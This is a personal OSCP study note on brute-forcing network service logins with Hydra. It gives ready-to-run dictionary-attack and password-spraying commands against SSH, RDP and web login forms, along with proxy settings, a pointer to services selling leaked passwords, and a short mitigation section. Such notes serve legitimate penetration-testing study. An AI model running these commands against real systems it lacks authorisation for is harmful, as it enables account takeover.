---
aliases:
  - Attacking Network Services Logins
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - password
  - password_attacks
  - network_services
  - network_services_logins
author: Mehdi N Tehrani
creat_date: 2023-12-30
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# SSH and RDP
#ssh #rdp 
## Hydra
#hydra
```sh
hydra -l <login> -L <login_file> -p <password> -P <password_file> -C <colon separated login:pass file> -M <servers list file> -t <tasks(threads) def:16> <service>://<server>:<port>
```
### dictionary attack
#dictionary_attack 
```sh
hydra -l <username> -P <wordlist> ssh://<ip>:<port>
       ^ login       ^ password file

# example
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.247.201
```

### password spraying
#password_spraying 
```sh
hydra -L <username file> -p <password> ssh://<ip>:<port>
       ^ login file       ^ password

# example
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#"
rdp://192.168.247.202
       ^ login file
```
#### obtain leaked passwords
#leaked_password
Services such as [ScatteredSecrets](https://scatteredsecrets.com/) track password leaks and compromises and sell the plaintext passwords.


> [!info] We should always try to leverage every plaintext password we discover by spraying them against the target's systems. This could reveal users that use the same password across multiple systems.

> [!danger] However, we must also use caution when leveraging broad-range attacks.

### HTTP post form
#http_post_form #http_post
```sh
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.247.201 http-post-form "/index.php:fm_user=user&fm_pwd=^PASS^:Login failed. Invalid"
```

### HTTP Basic Authorization
#basic_authorization #http_basic_authorization
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.247.201 http-get
```

# Proxy
#hydra_proxy #proxy 
```
export HYDRA_PROXY="connect://<ip>:<port>"
export HYDRA_PROXY="socks4://<ip>:<port>"
export HYDRA_PROXY="socks5://<ip>:<port>"
```

# Mitigation
## Web Application Firewall (WAF)
#waf
## fail2ban 
#fail2ban
https://www.fail2ban.org/wiki/index.php/Main_Page
Locks a user out after a set number of failed login attempts

